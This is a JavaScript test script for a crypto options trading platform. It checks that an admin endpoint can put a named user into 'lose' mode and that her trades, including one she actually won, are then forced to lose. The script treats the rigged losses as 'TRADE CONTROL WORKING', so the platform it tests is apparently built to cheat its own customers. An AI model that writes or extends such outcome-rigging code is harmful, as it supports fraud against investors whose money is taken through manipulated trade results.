const http = require('http');

// Test the actual trade control system with real API calls
async function testRealTradeControl() {
  console.log('🎯 REAL TRADE CONTROL TEST');
  console.log('='.repeat(50));
  
  const baseUrl = 'http://localhost:3005';
  const userId = 'user-angela-1758195715'; // Angela's user ID with "lose" mode
  
  try {
    // Step 1: Check current user trading mode
    console.log('1. Checking user trading mode...');
    const userResponse = await fetch(`${baseUrl}/api/users/${userId}`);
    const userData = await userResponse.json();
    console.log(`   User: ${userData.username}`);
    console.log(`   Trading Mode: ${userData.trading_mode || 'normal'}`);
    console.log(`   Current Balance: ${userData.balance}`);
    
    if (userData.trading_mode !== 'lose') {
      console.log('❌ User is not in LOSE mode. Setting to LOSE mode...');
      
      // Set user to lose mode
      const setModeResponse = await fetch(`${baseUrl}/api/admin/trading-control`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: userId,
          controlType: 'lose'
        })
      });
      
      if (setModeResponse.ok) {
        console.log('✅ User set to LOSE mode');
      } else {
        console.log('❌ Failed to set user to LOSE mode');
        return;
      }
    }
    
    // Step 2: Test the completion endpoint directly
    console.log('\n2. Testing trade completion endpoint directly...');
    
    const testTradeData = {
      tradeId: 'test-trade-' + Date.now(),
      userId: userId,
      won: true, // This should be overridden to false
      amount: 100,
      payout: 180
    };
    
    console.log('   Test trade data:', testTradeData);
    console.log('   Expected: Trade should be forced to LOSE');
    
    const completionResponse = await fetch(`${baseUrl}/api/trades/complete`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(testTradeData)
    });
    
    if (completionResponse.ok) {
      const result = await completionResponse.json();
      console.log('\n   ✅ Completion Response:');
      console.log(`      Success: ${result.success}`);
      console.log(`      Original Won: ${testTradeData.won}`);
      console.log(`      Final Won: ${result.won}`);
      console.log(`      Trading Mode: ${result.tradingMode}`);
      console.log(`      Override Applied: ${result.overrideApplied}`);
      console.log(`      Balance Change: ${result.balanceChange}`);
      console.log(`      Message: ${result.message}`);
      
      if (result.won === false && result.overrideApplied === true) {
        console.log('\n   🎯 ✅ TRADE CONTROL WORKING! Trade was forced to lose.');
      } else if (result.won === false && testTradeData.won === true) {
        console.log('\n   🎯 ✅ TRADE CONTROL WORKING! Trade outcome was overridden.');
      } else {
        console.log('\n   🎯 ❌ TRADE CONTROL FAILED! Trade was not forced to lose.');
      }
    } else {
      console.log('❌ Completion endpoint failed');
      const errorText = await completionResponse.text();
      console.log('   Error:', errorText);
    }
    
    // Step 3: Create a real options trade and test automatic completion
    console.log('\n3. Creating a real options trade...');
    
    const tradeData = {
      userId: userId,
      symbol: 'BTCUSDT',
      direction: 'up',
      amount: 50,
      duration: 30
    };
    
    const createResponse = await fetch(`${baseUrl}/api/trades/options`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(tradeData)
    });
    
    if (createResponse.ok) {
      const createResult = await createResponse.json();
      console.log(`   ✅ Trade created: ${createResult.trade.id}`);
      console.log(`   Duration: ${createResult.trade.duration} seconds`);
      console.log(`   Amount: ${createResult.trade.amount} USDT`);
      console.log(`   Direction: ${createResult.trade.direction}`);
      
      console.log('\n   ⏳ Waiting 35 seconds for automatic completion...');
      
      // Wait for automatic completion
      await new Promise(resolve => setTimeout(resolve, 35000));
      
      // Check the trade result
      console.log('\n4. Checking trade result after automatic completion...');
      
      const tradesResponse = await fetch(`${baseUrl}/api/users/${userId}/trades`);
      const trades = await tradesResponse.json();
      
      const completedTrade = trades.find(t => t.id === createResult.trade.id);
      if (completedTrade) {
        console.log(`   Trade ID: ${completedTrade.id}`);
        console.log(`   Result: ${completedTrade.result}`);
        console.log(`   Profit: ${completedTrade.profit}`);
        console.log(`   Status: ${completedTrade.status || 'N/A'}`);
        
        if (completedTrade.result === 'lose' || completedTrade.result === 'lost') {
          console.log('\n   🎯 ✅ AUTOMATIC TRADE CONTROL WORKING! Trade was forced to lose.');
        } else if (completedTrade.result === 'win' || completedTrade.result === 'won') {
          console.log('\n   🎯 ❌ AUTOMATIC TRADE CONTROL FAILED! Trade won when it should have lost.');
        } else {
          console.log(`\n   🎯 ⚠️ TRADE STATUS UNCLEAR: ${completedTrade.result}`);
        }
      } else {
        console.log('   ❌ Trade not found in completed trades');
      }
    } else {
      console.log('❌ Failed to create trade');
      const errorText = await createResponse.text();
      console.log('   Error:', errorText);
    }
    
  } catch (error) {
    console.error('❌ Test error:', error);
  }
}

// Helper function to make fetch requests (Node.js compatible)
async function fetch(url, options = {}) {
  const { default: fetch } = await import('node-fetch');
  return fetch(url, options);
}

// Run the test
testRealTradeControl();
